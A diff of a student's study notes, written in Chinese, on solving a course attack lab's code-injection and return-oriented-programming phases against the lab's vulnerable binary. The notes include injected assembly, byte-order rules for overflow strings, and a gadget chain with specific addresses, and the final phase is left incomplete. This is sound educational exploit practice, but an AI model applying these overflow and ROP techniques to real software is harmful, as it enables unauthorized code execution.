@@ -19,17 +19,94 @@ phase2:
 phase3:
   - 原理：
 	区别于phase2: 把立即数存到寄存器中，phase3需要把string的地址存到寄存器中
-	key points: 不能把string存到get buf特定区域，可能会被覆盖 
-  - sol:
+	key points: 不能把string存到get buf特定区域，可能会被覆盖
+	 	    解决方法：把string representation push到栈中，使得后续调用hexmatch和strncmp不会被覆盖
+	其他可能解决方法：
 	1. 把string 位置放到低于hexMatch和strncmp所需要的空间，需要知道hexmatch和strncmp大概需要的空间
 	2. 把string 写到hexMatch和strncmp的栈里面不会被改写的地址，需要知道hexmatch和strncmp会改写所分配栈的哪些空间
-	3. 把string 写到栈的高位
+
+  - sol:
 	步骤同phase2:
 	1. 改写get buf的return address 为injection code的地址
-	2. injection code: push cookie string onto stack
-			   push start addr of touch3 onto stack
-		 	   nop
-			   mov the addr of cookie string, %rdi
-		           ret
+	2. injection code: 
+		pushq $0x0 /* \0 for string */
+		mov $cookie_string, %rdi
+		pushq %rdi  	
+		push $touch3_addr
+		nop
+		mov the addr of cookie string, %rdi
+		ret
 	3. 指令返回时，跳转到touch3,此时cookie string 存到栈顶，不会被后续调用函数影响
 	缺点：touch3返回时，会出现异常
+	cookie:(string) 0x59b997fa --> (ascii) 0x35 39 62 39 39 37 66 61
+  -注意事项：
+	string的byte ordering
+	string的结束标志字符\0
+总结：byte ordering - little endian
+  -把string推到栈上时，要把开始字符放到低位字节，所有要反着推，例如'string '123'按照ascii码，hex表示为0x 31 32 33
+   当读取string时，str[0] = 'a',即低地址存放的是31，但是little endian的机器会把最低有效字节先放到最低地址，所以
+   要反着推
+	高地址 --> 低地址
+	33 32 31
+   push $0x333231
+
+ -把地址推到栈上时，例如地址为0x004017ec,push之后字节存放为
+  push $0x004017ec
+	高地址 -- > 低地址
+	00 40 17 ec
+  读取时也会按照该顺序读取，所以不需要反着推
+
+ -利用buffer overflow覆盖return address时，要反着写
+  当跳转地址为0x005561dc78
+	高地址 --> 低地址
+	00 55 61 dc 78
+  exploit string 应当反着写‘78 dc 61 55 00'来使得地址的低字节放到低地址中            
+
+
+ROP phase4
+ - 原理：利用buffer overflow改写return address到gadeget address, follow by ret, followe by another gadeget addr
+ - 思路：
+	利用buffer overflow把return addr改成gadeget addr 1
+	把cookie存到%rdi中
+	最后跟着touch2的addr
+ - 疑问：rop是不是要污染更多的stack
+ - 步骤：
+	exploit string:
+		filler
+		filler
+		gadget addr1 : pop %rax 58 90 c3 fun<addval_219> 0x004019ab
+		cookie string: 59 b9 97 fa
+		gadget addr2: mov %rax, %rdi  48 89 c7 c3 fun<addval_273> 0x4019a2
+		touch2 addr: ec 17 40 00
+ - 注意事项：
+	cookie是作为整数还是string存到内存里
+	cookie是unsigned val时，要反着写到内存中
+		string时，正着写
+
+rop phase5
+ - 原理：
+ - 思路：
+	call touch3
+	%rdi points the string representation of cookie
+	构造chain of gadget
+	...
+  	...
+	...
+	cookie
+	000
+	...
+	...
+	touch3_addr
+ - 步骤：
+	mov %rsp, %rax
+	mov %rax, %rdi
+	%rsp + 0x8
+	pop %rax
+	nop %rsp + 1
+	
+	
+	movl高4位置0，有什么用，访问低地址，但是gadget addr里面没办法访问寄存器中存的地址
+				
+	
+	
+	
